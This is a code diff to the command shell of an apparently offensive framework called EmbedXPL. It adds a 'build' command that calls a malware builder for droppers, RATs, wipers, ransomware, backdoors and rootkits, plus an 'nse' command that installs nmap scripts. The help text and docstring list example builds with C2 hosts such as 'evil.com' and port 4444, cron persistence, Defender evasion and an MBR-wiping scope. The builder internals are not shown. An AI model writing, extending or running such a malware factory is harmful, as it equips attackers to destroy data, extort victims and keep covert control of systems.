@@ -266,6 +266,14 @@ class EmbedXPLInterpreter(BaseInterpreter):
     vulns                           List found vulnerabilities
     creds                           List captured credentials
     sessions [list|show|delete]     Manage scan session history
+    build <component> [options]     Build malware (dropper|rat|wiper|ransomware|backdoor|rootkit)
+      Examples:
+        build dropper --lang python --arch armle --transport https --c2 10.0.0.1
+        build rat --lang go --arch arm64 --persist cron --evasion defender
+        build wiper --lang c --arch x64
+        build ransomware --lang python --evasion defender
+    nse install                     Install EmbedXPL NSE scripts into nmap
+    nse list                        List NSE scripts and install status
     exit                            Exit EmbedXPL"""
 
     module_help = """Module commands:
@@ -288,7 +296,9 @@ class EmbedXPLInterpreter(BaseInterpreter):
         self.show_sub_commands = ("info", "options", "advanced", "devices", "all", "encoders", "creds", "exploits", "scanners", "wordlists")
         self.search_sub_commands = ("type", "device", "language", "payload", "vendor")
 
-        self.global_commands = sorted(["use ", "exec ", "help", "exit", "show ", "search ", "sysinfo", "compute ", "discover ", "sessions "])
+        self.global_commands = sorted(["use ", "exec ", "help", "exit", "show ", "search ",
+                                        "sysinfo", "compute ", "discover ", "sessions ",
+                                        "build ", "nse ", "workspace ", "hosts ", "vulns ", "creds "])
         self.module_commands = ["run", "back", "set ", "setg ", "check"]
         self.module_commands.extend(self.global_commands)
         self.module_commands.sort()
@@ -1902,6 +1912,101 @@ class EmbedXPLInterpreter(BaseInterpreter):
             return
         rows = [[c.get("address",""), c.get("username",""), c.get("password",""), c.get("cred_type",""), c.get("found_at","")[:16]] for c in creds]
         print_table(["Host", "Username", "Password", "Type", "Found At"], *rows)
+
+    def command_nse(self, *args, **kwargs):
+        """nse install | list | run <script> <target> — Manage EmbedXPL NSE scripts."""
+        from embedxpl.tools.nse_installer import install, status, run_nse
+        if not args:
+            print_info("Usage: nse install | list | run <script> <target>")
+            return
+        subcmd = args[0].lower()
+        if subcmd == "install":
+            result = install(dry_run="--dry-run" in args)
+            print_success(f"NSE: {len(result.get('added',[]))} added, "
+                          f"{len(result.get('updated',[]))} updated, "
+                          f"{len(result.get('skipped',[]))} skipped")
+        elif subcmd == "list":
+            status()
+        elif subcmd == "run" and len(args) >= 3:
+            run_nse(args[1], args[2])
+        else:
+            print_info("Usage: nse install | list | run <script> <target>")
+
+    def command_build(self, *args, **kwargs):
+        """build <component> [--lang LANG] [--arch ARCH] [--transport PROTO] [--c2 HOST] [--port PORT]
+           [--persist METHOD] [--evasion PROFILE] [--output PATH]
+
+        Build malware components in multiple languages/architectures.
+
+        Components: dropper | stager | rat | implant | wiper | ransomware | backdoor | rootkit
+
+        Examples:
+            build dropper --lang python --arch armle --transport https --c2 10.0.0.1 --port 443
+            build rat --lang go --arch arm64 --transport dns --c2 evil.com --persist cron
+            build wiper --lang c --arch x64 --scope mbr,files
+            build ransomware --lang python --evasion defender --persist cron
+            build backdoor --lang powershell --c2 10.0.0.1 --port 4444 --evasion defender
+        """
+        if not args:
+            print_info("Usage: build <component> [options]")
+            print_info("Components: dropper | stager | rat | implant | wiper | ransomware | backdoor | rootkit")
+            return
+
+        component = args[0].lower()
+
+        # Parse --key value arguments
+        cfg_kwargs = {"component": component}
+        i = 1
+        while i < len(args):
+            a = str(args[i])
+            if a.startswith("--") and i + 1 < len(args):
+                key = a[2:].replace("-", "_")
+                val = str(args[i + 1])
+                if key in ("port", "key_bits", "key_size"):
+                    try: val = int(val)
+                    except ValueError: pass
+                elif key == "scope":
+                    val = [s.strip() for s in val.split(",")]
+                elif key == "extensions":
+                    val = [s.strip() for s in val.split(",")]
+                cfg_kwargs[key] = val
+                i += 2
+            else:
+                i += 1
+
+        # Map common aliases
+        if "c2" in cfg_kwargs:
+            cfg_kwargs["c2_host"] = cfg_kwargs.pop("c2")
+        if "lang" not in cfg_kwargs:
+            cfg_kwargs["lang"] = "python"
+        if "arch" not in cfg_kwargs:
+            cfg_kwargs["arch"] = "x64"
+
+        try:
+            from embedxpl.core.malware_builder.builder import MalwareBuilder, BuildConfig
+            cfg = BuildConfig.from_args(**cfg_kwargs)
+
+            print_info(f"Building {component} [{cfg.lang}/{cfg.arch}] transport={cfg.transport}")
+            if cfg.evasion:
+                print_info(f"Evasion profile: {cfg.evasion}")
+
+            builder = MalwareBuilder(cfg)
+            result = builder.build()
+
+            if result.success:
+                print_success(str(result))
+                print_info(f"Output: {result.output_path}")
+                if result.source_path:
+                    print_info(f"Source: {result.source_path}")
+            else:
+                print_error(f"Build failed: {result.error}")
+
+        except ImportError as e:
+            print_error(f"Malware builder not available: {e}")
+        except Exception as e:
+            import traceback
+            print_error(f"Build error: {e}")
+            print_info(traceback.format_exc()[-300:])
 
     def command_exit(self, *args, **kwargs):
         raise EOFError
